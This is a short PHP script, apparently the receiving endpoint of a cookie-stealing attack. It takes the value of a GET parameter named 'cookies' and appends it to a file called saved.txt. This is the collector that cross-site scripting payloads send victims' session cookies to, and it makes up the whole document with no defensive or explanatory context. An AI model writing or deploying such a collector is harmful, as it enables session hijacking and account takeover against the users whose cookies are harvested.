<?php
	
		$fp = fopen('saved.txt', 'a');
		fwrite($fp,$_GET['cookies']."\n\n");
		fclose($fp);
?>